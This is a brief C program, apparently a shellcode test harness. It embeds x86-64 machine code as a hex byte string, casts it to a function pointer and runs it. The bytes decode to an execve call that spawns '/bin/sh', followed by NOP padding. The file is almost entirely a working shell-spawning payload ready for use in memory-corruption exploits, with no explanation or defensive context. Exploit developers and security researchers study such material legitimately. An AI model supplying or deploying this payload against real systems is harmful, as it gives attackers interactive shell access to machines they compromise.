#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x48\x31\xc0\x48\x31\xf6\x48\x31\xdb\x50\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x90\x90\x90\x90"

;

main()
{

  printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}
